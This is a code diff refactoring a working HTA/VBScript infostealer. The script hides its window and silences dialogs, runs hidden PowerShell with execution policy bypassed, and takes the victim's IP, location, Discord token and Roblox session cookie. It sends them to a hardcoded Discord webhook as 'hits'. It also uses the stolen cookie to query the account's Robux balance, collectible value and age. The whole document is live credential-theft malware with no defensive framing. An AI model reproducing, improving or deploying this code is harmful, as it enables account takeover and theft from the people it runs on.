@@ -11,22 +11,20 @@ WH   = "https://discord.com/api/webhooks/1555782526923177994/bNFuu-nXUEK5faw8p_3
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' suppress any OS dialog that might pop (mshta alert override)
-Sub window_onError() : End Sub
-Function window_alert(msg) : End Function
+Function window_alert(msg)   : End Function
 Function window_confirm(msg) : window_confirm = True : End Function
-Function window_prompt(msg, def) : window_prompt = def : End Function
+Function window_prompt(m, d) : window_prompt = d : End Function
+Sub    window_onError()      : End Sub
 
 Sub Window_OnLoad()
     window.resizeTo 0, 0
     window.moveTo -32000, -32000
-    document.title = "."
     IP()
     GrabDiscord()
     GrabRoblox()
 End Sub
 
-' ── helpers ────────────────────────────────────────────────────────────────
+' ── util ───────────────────────────────────────────────────────────────────
 
 Function TmpFile(n)
     TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & n
@@ -39,27 +37,43 @@ Function ReadFile(p)
 End Function
 
 Function RunPS(psf, tf)
-    ' run powershell hidden, wait, return output file contents
     sh.Run "cmd /c powershell -NoP -NonI -W Hidden -Exec Bypass -File """ & psf & """", 0, True
     If fso.FileExists(psf) Then fso.DeleteFile psf, True
-    If Not fso.FileExists(tf) Then RunPS = "" : Exit Function
+    RunPS = ""
+    If Not fso.FileExists(tf) Then Exit Function
     RunPS = Trim(ReadFile(tf))
     fso.DeleteFile tf, True
+End Function
+
+Function RxFirst(src, pat)
+    Dim rx : Set rx = CreateObject("VBScript.RegExp")
+    rx.Pattern = pat : rx.IgnoreCase = True
+    Dim m : Set m = rx.Execute(src)
+    RxFirst = ""
+    If m.Count > 0 Then
+        If m(0).SubMatches.Count > 0 Then
+            RxFirst = m(0).SubMatches(0)
+        Else
+            RxFirst = m(0).Value
+        End If
+    End If
+    Set rx = Nothing
 End Function
 
 ' ── webhook ────────────────────────────────────────────────────────────────
 
 Function Ej(s)
-    Ej = s
-    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
-    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
-    Ej = Replace(Ej, vbCrLf, "\n")
-    Ej = Replace(Ej, vbCr,   "\n")
-    Ej = Replace(Ej, vbLf,   "\n")
-    Ej = Replace(Ej, vbTab,  "\t")
+    Ej = Replace(Replace(Replace(Replace(Replace(Replace( _
+         s, _
+         Chr(92), Chr(92) & Chr(92)), _
+         Chr(34), Chr(92) & Chr(34)), _
+         vbCrLf, "\n"), _
+         vbCr,   "\n"), _
+         vbLf,   "\n"), _
+         vbTab,  "\t")
 End Function
 
-Sub WHPost(body, ct)
+Sub WHSend(body, ct)
     Dim h : Set h = CreateObject("MSXML2.XMLHTTP.6.0")
     h.Open "POST", WH, False
     h.SetRequestHeader "Content-Type", ct
@@ -68,51 +82,45 @@ Sub WHPost(body, ct)
 End Sub
 
 Sub PostEmbed(title, desc, colour)
-    Dim DQ : DQ = Chr(34)
-    Dim j
-    j = "{" & DQ & "embeds" & DQ & ":[{" _
-      & DQ & "title"       & DQ & ":" & DQ & Ej(title) & DQ & "," _
-      & DQ & "description" & DQ & ":" & DQ & Ej(desc)  & DQ & "," _
-      & DQ & "color"       & DQ & ":" & colour _
-      & "}]}"
-    WHPost j, "application/json"
+    Dim q : q = Chr(34)
+    WHSend "{" & q & "embeds" & q & ":[{" _
+         & q & "title"       & q & ":" & q & Ej(title) & q & "," _
+         & q & "description" & q & ":" & q & Ej(desc)  & q & "," _
+         & q & "color"       & q & ":" & colour & "}]}", _
+         "application/json"
 End Sub
 
 Sub PostFile(fn, content)
-    Dim DQ : DQ = Chr(34)
-    Dim b  : b  = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
-    Dim bd : bd = "--" & b & vbCrLf _
-               & "Content-Disposition: form-data; name=" & DQ & "file" & DQ _
-               & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf _
-               & content & vbCrLf & "--" & b & "--"
-    WHPost bd, "multipart/form-data; boundary=" & b
+    Dim q : q = Chr(34)
+    Dim b : b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
+    WHSend "--" & b & vbCrLf _
+         & "Content-Disposition: form-data; name=" & q & "file" & q _
+         & "; filename=" & q & fn & q & vbCrLf & vbCrLf _
+         & content & vbCrLf & "--" & b & "--", _
+         "multipart/form-data; boundary=" & b
 End Sub
 
-' ── IP info ────────────────────────────────────────────────────────────────
+' ── IP ─────────────────────────────────────────────────────────────────────
 
 Sub IP()
-    Dim xh, ip, geo, ll
-    Set xh = CreateObject("MSXML2.XMLHTTP.6.0")
-    xh.Open "GET", "https://api.ipify.org/", False : xh.Send
+    Dim xh : Set xh = CreateObject("MSXML2.XMLHTTP.6.0")
+
+    xh.Open "GET", "https://api.ipify.org/", False
+    xh.Send
     If xh.Status <> 200 Then Set xh = Nothing : Exit Sub
-    ip = Trim(xh.responseText)
+    Dim ip : ip = Trim(xh.responseText)
     If Len(ip) < 7 Then Set xh = Nothing : Exit Sub
 
-    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False : xh.Send
-    Set xh = Nothing
-    If xh Is Nothing Then Exit Sub
-
-    Set xh = CreateObject("MSXML2.XMLHTTP.6.0")
-    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False : xh.Send
-    ll = Split(xh.responseText, vbLf)
+    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
+    xh.Send
+    Dim ll : ll = Split(xh.responseText, vbLf)
     Set xh = Nothing
 
-    Dim desc : desc = ""
-    desc = desc & ":desktop: **PC** — " & PC & "  |  **User** — " & USER & vbLf
-    desc = desc & ":globe_with_meridians: **IP** — " & ip & vbLf
+    Dim desc : desc = ":desktop: **" & PC & "**  /  " & USER & vbLf _
+                    & ":globe_with_meridians: **IP** — " & ip & vbLf
     If UBound(ll) >= 3 Then
-        desc = desc & ":round_pushpin: " & Trim(ll(2)) & ", " & Trim(ll(1)) & ", " & Trim(ll(0)) & vbLf
-        desc = desc & ":signal_strength: **ISP** — " & Trim(ll(3))
+        desc = desc & ":round_pushpin: " & Trim(ll(2)) & ", " & Trim(ll(1)) & ", " & Trim(ll(0)) & vbLf _
+                    & ":signal_strength: **ISP** — " & Trim(ll(3))
     End If
 
     PostEmbed "New Hit", desc, 5763719
@@ -224,9 +232,10 @@ Sub GrabDiscord()
     f.Close : Set f = Nothing
 
     Dim raw : raw = RunPS(psf, tf)
-    If raw <> "NOT_FOUND" And Len(raw) > 10 Then
+    If raw <> "" And raw <> "NOT_FOUND" And Len(raw) > 10 Then
         PostFile "discord_token.txt", raw
-        PostEmbed ":key: Discord Token", "``" & Left(raw, 20) & "...``" & vbLf & "Full token in attached file.", 7506394
+        PostEmbed ":key: Discord Token", ":bust_in_silhouette: **" & PC & "**  /  " & USER & vbLf _
+            & "``" & Left(raw, 24) & "...``" & vbLf & "Full token attached.", 7506394
     End If
 End Sub
 
@@ -353,7 +362,7 @@ Sub GrabRoblox()
     f.Close : Set f = Nothing
 
     Dim raw : raw = RunPS(psf, tf)
-    If raw <> "NOT_FOUND" And Len(raw) > 10 Then
+    If raw <> "" And raw <> "NOT_FOUND" And Len(raw) > 10 Then
         PostFile "roblox_cookie.txt", raw
         GrabRobloxInfo raw
     End If
@@ -364,35 +373,33 @@ End Sub
 Sub GrabRobloxInfo(cookie)
     Dim xh : Set xh = CreateObject("MSXML2.XMLHTTP.6.0")
 
-    ' userinfo — uid, username, robux, premium
     xh.Open "GET", "https://www.roblox.com/mobileapi/userinfo", False
     xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
     xh.Send
     If xh.Status <> 200 Then Set xh = Nothing : Exit Sub
-    Dim json : json = xh.responseText
+    Dim j : j = xh.responseText
 
-    Dim uid     : uid     = RxFirst(json, """UserID"":(\d+)")
-    Dim uname   : uname   = RxFirst(json, """UserName"":""([^""]+)""")
-    Dim robux   : robux   = RxFirst(json, """RobuxBalance"":(\d+)")
-    Dim premium : premium = RxFirst(json, """IsPremium"":(true|false)")
+    Dim uid     : uid     = RxFirst(j, """UserID"":(\d+)")
+    Dim uname   : uname   = RxFirst(j, """UserName"":""([^""]+)""")
+    Dim robux   : robux   = RxFirst(j, """RobuxBalance"":(\d+)")
+    Dim premium : premium = RxFirst(j, """IsPremium"":(true|false)")
     If uid = "" Then Set xh = Nothing : Exit Sub
     If robux   = "" Then robux   = "0"
     If premium = "" Then premium = "false"
 
-    ' account age
     xh.Open "GET", "https://users.roblox.com/v1/users/" & uid, False
     xh.Send
     Dim ageDays : ageDays = "?"
     If xh.Status = 200 Then
         Dim created : created = RxFirst(xh.responseText, """created"":""([^T]+)")
         If created <> "" Then
-            Dim cd : cd = CDate(created)
+            Dim cd
+            cd = CDate(created)
             If Err.Number = 0 Then ageDays = CStr(DateDiff("d", cd, Now()))
             Err.Clear
         End If
     End If
 
-    ' RAP
     Dim rapVal : rapVal = "0"
     xh.Open "GET", "https://inventory.roblox.com/v1/users/" & uid & "/assets/collectibles?limit=100", False
     xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
@@ -418,37 +425,22 @@ Sub GrabRobloxInfo(cookie)
     End If
     Set xh = Nothing
 
-    ' premium display
     Dim premStr : premStr = "No"
     If LCase(premium) = "true" Then premStr = "Yes"
 
     Dim desc : desc = ""
     desc = desc & ":bust_in_silhouette:  **" & uname & "**" & vbLf
-    desc = desc & "────────────────────" & vbLf
+    desc = desc & "──────────────────" & vbLf
     desc = desc & ":coin:  **Robux** — " & robux & vbLf
-    desc = desc & ":star:  **Premium** — " & premStr & vbLf
+    desc = desc & ":star2:  **Premium** — " & premStr & vbLf
     desc = desc & ":trophy:  **RAP** — " & rapVal & vbLf
     desc = desc & ":calendar:  **Age** — " & ageDays & " days" & vbLf
     desc = desc & ":computer:  **PC** — " & PC & "  /  " & USER & vbLf
-    desc = desc & "────────────────────" & vbLf
+    desc = desc & "──────────────────" & vbLf
     desc = desc & ":cookie:  Cookie attached"
 
     PostEmbed ":video_game:  Roblox Hit", desc, 16711680
 End Sub
-
-' ── regex helper ───────────────────────────────────────────────────────────
-
-Function RxFirst(src, pat)
-    Dim rx : Set rx = CreateObject("VBScript.RegExp")
-    rx.Pattern = pat : rx.IgnoreCase = True
-    Dim m : Set m = rx.Execute(src)
-    If m.Count > 0 Then
-        If m(0).SubMatches.Count > 0 Then RxFirst = m(0).SubMatches(0) Else RxFirst = m(0).Value
-    Else
-        RxFirst = ""
-    End If
-    Set rx = Nothing
-End Function
 
 </script>
 </head><body bgcolor="black"></body></html>
